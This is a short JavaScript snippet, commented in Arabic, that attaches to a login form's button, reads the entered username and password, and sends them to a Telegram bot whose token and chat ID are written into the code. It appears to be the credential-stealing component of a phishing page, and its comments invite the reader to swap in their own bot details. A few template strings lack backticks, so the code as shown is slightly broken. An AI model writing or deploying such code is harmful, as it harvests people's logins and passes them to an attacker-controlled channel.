document.getElementById('loginButton').addEventListener('click', function(e) {
  e.preventDefault();  // لمنع الإرسال الافتراضي للنموذج إذا كان هذا يعمل

  // الحصول على قيم البيانات من الحقول
  const username = document.getElementById('username').value;
  const password = document.getElementById('password').value;

  // إرسال البيانات إلى بوت تلجرام
  const botToken = '7664974744:AAG0ueJAEKAs7d8e2Yr48MifjmEBm093bV8';  // استبدل هذا بالتوكن الخاص بك
  const chatId = '7643313499';  // استبدل هذا بمعرف الدردشة الخاص بك
  const telegramUrl = https://api.telegram.org/bot${botToken}/sendMessage;

  const message = New Login Attempt:\nUsername: ${username}\nPassword: ${password};

  // إرسال الطلب إلى تلجرام
  fetch(`${telegramUrl}?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
    .then(response => response.json())
    .then(data => {
      if (data.ok) {
        console.log('Message sent successfully!');
      } else {
        console.error('Error sending message:', data);
      }
    })
    .catch(error => console.error('Error:', error));
});
